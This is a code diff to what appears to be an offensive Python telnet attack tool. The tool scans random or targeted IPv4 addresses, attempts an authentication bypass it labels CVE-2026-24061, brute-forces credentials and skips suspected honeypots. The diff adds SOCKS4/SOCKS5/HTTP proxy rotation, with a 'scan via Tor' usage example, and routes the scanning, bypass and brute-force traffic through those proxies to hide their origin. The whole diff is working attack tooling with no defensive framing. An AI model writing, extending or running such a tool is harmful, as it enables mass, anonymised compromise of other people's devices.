@@ -269,6 +269,208 @@ def is_honeypot(banner: str, patterns: list[str]) -> bool:
     return any(p.lower() in bl for p in patterns)
 
 
+# === PROXY SUPPORT ===
+@dataclass
+class Proxy:
+    scheme: str
+    host: str
+    port: int
+    username: str = ""
+    password: str = ""
+
+
+def parse_proxy(url: str) -> Proxy:
+    url = url.strip()
+    if "://" not in url:
+        url = "socks5://" + url
+    scheme, rest = url.split("://", 1)
+    scheme = scheme.lower()
+    if scheme not in ("socks5", "socks4", "http", "https"):
+        raise ValueError(f"Unsupported proxy scheme: {scheme}")
+    if scheme == "https":
+        scheme = "http"
+    username = password = ""
+    if "@" in rest:
+        auth, rest = rest.rsplit("@", 1)
+        if ":" in auth:
+            username, password = auth.split(":", 1)
+        else:
+            username = auth
+    if ":" in rest:
+        host, port_str = rest.rsplit(":", 1)
+        port_num = int(port_str)
+    else:
+        host = rest
+        port_num = 1080 if scheme.startswith("socks") else 8080
+    return Proxy(scheme=scheme, host=host, port=port_num,
+                 username=username, password=password)
+
+
+def load_proxy_file(path: str) -> list[Proxy]:
+    proxies = []
+    with open(path) as f:
+        for line in f:
+            line = line.strip()
+            if line and not line.startswith("#"):
+                try:
+                    proxies.append(parse_proxy(line))
+                except (ValueError, IndexError):
+                    logger.warning(f"Skipping invalid proxy: {line}")
+    return proxies
+
+
+class ProxyPool:
+    def __init__(self, proxies: list[Proxy]):
+        self._proxies = proxies
+        self._idx = 0
+        self._lock = threading.Lock()
+
+    def next(self) -> Proxy:
+        with self._lock:
+            p = self._proxies[self._idx % len(self._proxies)]
+            self._idx += 1
+            return p
+
+    def __bool__(self):
+        return bool(self._proxies)
+
+    def __len__(self):
+        return len(self._proxies)
+
+
+def _socks5_sync(sock, ip: str, port: int, user: str = "", pwd: str = ""):
+    if user:
+        sock.sendall(b'\x05\x02\x00\x02')
+    else:
+        sock.sendall(b'\x05\x01\x00')
+    resp = sock.recv(2)
+    if len(resp) < 2 or resp[0] != 0x05:
+        raise ConnectionError("SOCKS5 greeting failed")
+    if resp[1] == 0x02 and user:
+        auth = (b'\x01' + bytes([len(user)]) + user.encode()
+                + bytes([len(pwd)]) + pwd.encode())
+        sock.sendall(auth)
+        ar = sock.recv(2)
+        if len(ar) < 2 or ar[1] != 0x00:
+            raise ConnectionError("SOCKS5 auth failed")
+    elif resp[1] == 0xFF:
+        raise ConnectionError("SOCKS5 no acceptable method")
+    sock.sendall(b'\x05\x01\x00\x01' + socket.inet_aton(ip)
+                 + port.to_bytes(2, 'big'))
+    resp = sock.recv(10)
+    if len(resp) < 4 or resp[1] != 0x00:
+        raise ConnectionError(f"SOCKS5 connect refused ({resp[1] if len(resp) > 1 else '?'})")
+
+
+def _socks4_sync(sock, ip: str, port: int):
+    sock.sendall(b'\x04\x01' + port.to_bytes(2, 'big')
+                 + socket.inet_aton(ip) + b'\x00')
+    resp = sock.recv(8)
+    if len(resp) < 2 or resp[1] != 0x5A:
+        raise ConnectionError("SOCKS4 connect rejected")
+
+
+def _http_connect_sync(sock, ip: str, port: int):
+    sock.sendall(f"CONNECT {ip}:{port} HTTP/1.1\r\n"
+                 f"Host: {ip}:{port}\r\n\r\n".encode())
+    resp = b""
+    while b"\r\n\r\n" not in resp and len(resp) < 4096:
+        chunk = sock.recv(4096)
+        if not chunk:
+            break
+        resp += chunk
+    status = resp.split(b"\r\n")[0]
+    if b" 200 " not in status:
+        raise ConnectionError(
+            f"HTTP CONNECT failed: {status.decode(errors='replace')}")
+
+
+def proxy_connect(sock, proxy: Proxy, ip: str, port: int):
+    sock.connect((proxy.host, proxy.port))
+    if proxy.scheme == "socks5":
+        _socks5_sync(sock, ip, port, proxy.username, proxy.password)
+    elif proxy.scheme == "socks4":
+        _socks4_sync(sock, ip, port)
+    elif proxy.scheme == "http":
+        _http_connect_sync(sock, ip, port)
+
+
+async def _socks5_async(r, w, ip: str, port: int,
+                        user: str = "", pwd: str = ""):
+    if user:
+        w.write(b'\x05\x02\x00\x02')
+    else:
+        w.write(b'\x05\x01\x00')
+    await w.drain()
+    resp = await asyncio.wait_for(r.readexactly(2), timeout=10)
+    if resp[0] != 0x05:
+        raise ConnectionError("SOCKS5 greeting failed")
+    if resp[1] == 0x02 and user:
+        auth = (b'\x01' + bytes([len(user)]) + user.encode()
+                + bytes([len(pwd)]) + pwd.encode())
+        w.write(auth)
+        await w.drain()
+        ar = await asyncio.wait_for(r.readexactly(2), timeout=10)
+        if ar[1] != 0x00:
+            raise ConnectionError("SOCKS5 auth failed")
+    elif resp[1] == 0xFF:
+        raise ConnectionError("SOCKS5 no acceptable method")
+    w.write(b'\x05\x01\x00\x01' + socket.inet_aton(ip)
+            + port.to_bytes(2, 'big'))
+    await w.drain()
+    resp = await asyncio.wait_for(r.readexactly(4), timeout=10)
+    if resp[1] != 0x00:
+        raise ConnectionError(f"SOCKS5 connect refused ({resp[1]})")
+    if resp[3] == 0x01:
+        await r.readexactly(6)
+    elif resp[3] == 0x03:
+        dl = (await r.readexactly(1))[0]
+        await r.readexactly(dl + 2)
+    elif resp[3] == 0x04:
+        await r.readexactly(18)
+
+
+async def _socks4_async(r, w, ip: str, port: int):
+    w.write(b'\x04\x01' + port.to_bytes(2, 'big')
+            + socket.inet_aton(ip) + b'\x00')
+    await w.drain()
+    resp = await asyncio.wait_for(r.readexactly(8), timeout=10)
+    if resp[1] != 0x5A:
+        raise ConnectionError("SOCKS4 connect rejected")
+
+
+async def _http_connect_async(r, w, ip: str, port: int):
+    w.write(f"CONNECT {ip}:{port} HTTP/1.1\r\n"
+            f"Host: {ip}:{port}\r\n\r\n".encode())
+    await w.drain()
+    resp = b""
+    while b"\r\n\r\n" not in resp and len(resp) < 4096:
+        chunk = await asyncio.wait_for(r.read(4096), timeout=10)
+        if not chunk:
+            break
+        resp += chunk
+    if b" 200 " not in resp.split(b"\r\n")[0]:
+        raise ConnectionError("HTTP CONNECT failed")
+
+
+async def proxy_connect_async(proxy: Proxy, ip: str, port: int,
+                              timeout: int = 15):
+    r, w = await asyncio.wait_for(
+        asyncio.open_connection(proxy.host, proxy.port), timeout=timeout)
+    try:
+        if proxy.scheme == "socks5":
+            await _socks5_async(r, w, ip, port,
+                                proxy.username, proxy.password)
+        elif proxy.scheme == "socks4":
+            await _socks4_async(r, w, ip, port)
+        elif proxy.scheme == "http":
+            await _http_connect_async(r, w, ip, port)
+    except Exception:
+        w.close()
+        raise
+    return r, w
+
+
 # === COUNTERS ===
 class Stats:
     def __init__(self):
@@ -341,6 +543,8 @@ def _strip_iac(data: bytes, writer) -> str:
                         j += 2
                         break
                     j += 1
+                else:
+                    j = len(data)
                 i = j
             elif cmd == _IAC:
                 out.append(_IAC)
@@ -411,13 +615,17 @@ def _handle_bypass_iac(data: bytes, writer, env_sent: bool) -> tuple[str, bool]:
     return out.decode("ascii", errors="replace"), env_sent
 
 
-async def telnet_auth_bypass(ip: str, port: int, timeout: int = 15) -> tuple[bool, str]:
+async def telnet_auth_bypass(ip: str, port: int, timeout: int = 15,
+                             proxy: Proxy | None = None) -> tuple[bool, str]:
     """Attempt CVE-2026-24061 auth bypass via NEW-ENVIRON USER injection."""
     banner = ""
     try:
-        reader, writer = await asyncio.wait_for(
-            asyncio.open_connection(ip, port), timeout=timeout,
-        )
+        if proxy:
+            reader, writer = await proxy_connect_async(proxy, ip, port, timeout=timeout)
+        else:
+            reader, writer = await asyncio.wait_for(
+                asyncio.open_connection(ip, port), timeout=timeout,
+            )
         writer.write(bytes([_IAC, _WILL, _NEW_ENVIRON]))
         await writer.drain()
 
@@ -456,13 +664,17 @@ async def telnet_auth_bypass(ip: str, port: int, timeout: int = 15) -> tuple[boo
 
 # === TELNET BRUTE FORCE ===
 async def telnet_try(ip: str, port: int, user: str, passwd: str,
-                     timeout: int = 20) -> tuple[bool, str]:
+                     timeout: int = 20,
+                     proxy: Proxy | None = None) -> tuple[bool, str]:
     banner = ""
     try:
-        reader, writer = await asyncio.wait_for(
-            asyncio.open_connection(ip, port),
-            timeout=timeout,
-        )
+        if proxy:
+            reader, writer = await proxy_connect_async(proxy, ip, port, timeout=timeout)
+        else:
+            reader, writer = await asyncio.wait_for(
+                asyncio.open_connection(ip, port),
+                timeout=timeout,
+            )
         await asyncio.sleep(random.uniform(0.05, 0.25))
 
         async def _read():
@@ -523,7 +735,8 @@ async def telnet_try(ip: str, port: int, user: str, passwd: str,
 async def brute_worker(worker_id: int, creds: list, queue: TargetQueue,
                        result_log: LogWriter, banner_log: LogWriter,
                        stats: Stats, cfg: ScanConfig, run_flag: dict,
-                       no_bypass: bool = False):
+                       no_bypass: bool = False,
+                       proxy_pool: ProxyPool | None = None):
     while run_flag["run"]:
         tgt = queue.pop()
         if not tgt:
@@ -533,8 +746,9 @@ async def brute_worker(worker_id: int, creds: list, queue: TargetQueue,
         await asyncio.sleep(random.uniform(0.02, 0.1))
 
         if not no_bypass:
+            proxy = proxy_pool.next() if proxy_pool else None
             bypass_ok, bypass_banner = await telnet_auth_bypass(
-                tgt.ip, tgt.port, timeout=cfg.bypass_timeout,
+                tgt.ip, tgt.port, timeout=cfg.bypass_timeout, proxy=proxy,
             )
             if is_honeypot(bypass_banner, cfg.honeypot_patterns):
                 stats.incr("honeypots")
@@ -559,8 +773,9 @@ async def brute_worker(worker_id: int, creds: list, queue: TargetQueue,
             if not run_flag["run"]:
                 break
 
+            proxy = proxy_pool.next() if proxy_pool else None
             shell, banner = await telnet_try(tgt.ip, tgt.port, user, passwd,
-                                             timeout=cfg.brute_timeout)
+                                             timeout=cfg.brute_timeout, proxy=proxy)
 
             if is_honeypot(banner, cfg.honeypot_patterns):
                 stats.incr("honeypots")
@@ -587,7 +802,8 @@ async def brute_worker(worker_id: int, creds: list, queue: TargetQueue,
 # === SCANNER WORKER (scoped) ===
 def scan_worker_scoped(worker_id: int, ip_iter, ports: list[int],
                        queue: TargetQueue, scan_log: LogWriter,
-                       stats: Stats, cfg: ScanConfig, run_flag: dict):
+                       stats: Stats, cfg: ScanConfig, run_flag: dict,
+                       proxy_pool: ProxyPool | None = None):
     for ip in ip_iter:
         if not run_flag["run"]:
             break
@@ -596,7 +812,15 @@ def scan_worker_scoped(worker_id: int, ip_iter, ports: list[int],
             try:
                 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                     sock.settimeout(cfg.scan_timeout)
-                    if sock.connect_ex((ip, port)) == 0:
+                    if proxy_pool:
+                        try:
+                            proxy_connect(sock, proxy_pool.next(), ip, port)
+                            port_open = True
+                        except Exception:
+                            port_open = False
+                    else:
+                        port_open = sock.connect_ex((ip, port)) == 0
+                    if port_open:
                         if queue.push(ip, port):
                             stats.incr("open")
                             result = ScanResult(ip=ip, port=port)
@@ -612,18 +836,25 @@ def scan_worker_scoped(worker_id: int, ip_iter, ports: list[int],
 # === SCANNER WORKER (random) ===
 def scan_worker_random(worker_id: int, total_workers: int, ports: list[int],
                        queue: TargetQueue, scan_log: LogWriter,
-                       stats: Stats, cfg: ScanConfig, run_flag: dict):
+                       stats: Stats, cfg: ScanConfig, run_flag: dict,
+                       proxy_pool: ProxyPool | None = None):
     ipgen = RandomIPGen(seed=(int(time.time() * 1000) ^ os.getpid() ^ worker_id))
     while run_flag["run"]:
         ip = ipgen.next()
-        if (int(ipaddress.IPv4Address(ip)) % total_workers) != worker_id:
-            continue
         for port in ports:
             stats.incr("scanned")
             try:
                 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                     sock.settimeout(cfg.scan_timeout)
-                    if sock.connect_ex((ip, port)) == 0:
+                    if proxy_pool:
+                        try:
+                            proxy_connect(sock, proxy_pool.next(), ip, port)
+                            port_open = True
+                        except Exception:
+                            port_open = False
+                    else:
+                        port_open = sock.connect_ex((ip, port)) == 0
+                    if port_open:
                         if queue.push(ip, port):
                             stats.incr("open")
                             result = ScanResult(ip=ip, port=port)
@@ -683,6 +914,14 @@ examples:
   %(prog)s -T 10.0.0.1 -T 10.0.0.2 -p 23     # scan specific hosts
   %(prog)s -T targets.txt                      # load targets from file
   %(prog)s -T 192.168.1.0/24 --creds creds.txt --rate-limit 50
+  %(prog)s --proxy socks5://127.0.0.1:9050    # scan via Tor
+  %(prog)s --proxy-file proxies.txt            # rotate through proxy list
+
+proxy formats:
+  socks5://host:port            SOCKS5 proxy
+  socks5://user:pass@host:port  SOCKS5 with auth
+  socks4://host:port            SOCKS4 proxy
+  http://host:port              HTTP CONNECT proxy
 """
     )
     parser.add_argument("-T", "--target", action="append", default=[],
@@ -709,6 +948,10 @@ examples:
                         help="Output directory (default: output)")
     parser.add_argument("-v", "--verbose", action="store_true")
     parser.add_argument("--config", default="", help="Config file path")
+    parser.add_argument("--proxy", default="",
+                        help="Proxy URL (socks5://host:port, socks4://host:port, http://host:port)")
+    parser.add_argument("--proxy-file", default="",
+                        help="File with proxy URLs (one per line), rotated round-robin")
     args = parser.parse_args()
 
     # Load config
@@ -728,6 +971,25 @@ examples:
         scan_cfg.brute_threads = args.brute_threads
     if args.rate_limit > 0:
         scan_cfg.rate_limit = args.rate_limit
+
+    # Proxy setup
+    proxy_pool = None
+    proxies = []
+    if args.proxy:
+        try:
+            proxies.append(parse_proxy(args.proxy))
+        except ValueError as e:
+            print(f"Error: invalid proxy: {e}")
+            sys.exit(1)
+    if args.proxy_file:
+        proxies.extend(load_proxy_file(args.proxy_file))
+    for p_str in scan_cfg.proxy_list:
+        try:
+            proxies.append(parse_proxy(p_str))
+        except (ValueError, IndexError):
+            pass
+    if proxies:
+        proxy_pool = ProxyPool(proxies)
 
     output_dir = Path(args.output)
     setup_logging(output_dir, args.verbose)
@@ -794,7 +1056,7 @@ examples:
             for i in range(scan_cfg.scanner_threads):
                 th = threading.Thread(
                     target=scan_worker_scoped,
-                    args=(i, shared_iter, ports, queue, scan_log, stats, scan_cfg, run_flag),
+                    args=(i, shared_iter, ports, queue, scan_log, stats, scan_cfg, run_flag, proxy_pool),
                     daemon=True,
                 )
                 th.start()
@@ -803,13 +1065,15 @@ examples:
             for i in range(scan_cfg.scanner_threads):
                 th = threading.Thread(
                     target=scan_worker_random,
-                    args=(i, scan_cfg.scanner_threads, ports, queue, scan_log, stats, scan_cfg, run_flag),
+                    args=(i, scan_cfg.scanner_threads, ports, queue, scan_log, stats, scan_cfg, run_flag, proxy_pool),
                     daemon=True,
                 )
                 th.start()
                 scan_threads.append(th)
 
         logger.info(f"[*] Started {len(scan_threads)} scanner threads on ports {ports}")
+        if proxy_pool:
+            logger.info(f"[*] Using {len(proxy_pool)} proxy/proxies (round-robin)")
 
         # Status thread
         threading.Thread(target=status_printer,
@@ -821,10 +1085,10 @@ examples:
             async def run_bruters():
                 tasks = []
                 for i in range(scan_cfg.brute_threads):
-                    shard = creds[i::scan_cfg.brute_threads] or creds
-                    tasks.append(brute_worker(i, shard, queue, result_log,
+                    tasks.append(brute_worker(i, creds, queue, result_log,
                                               banner_log, stats, scan_cfg, run_flag,
-                                              no_bypass=no_bypass))
+                                              no_bypass=no_bypass,
+                                              proxy_pool=proxy_pool))
                 await asyncio.gather(*tasks)
 
             logger.info(f"[*] Started {scan_cfg.brute_threads} brute-force workers")
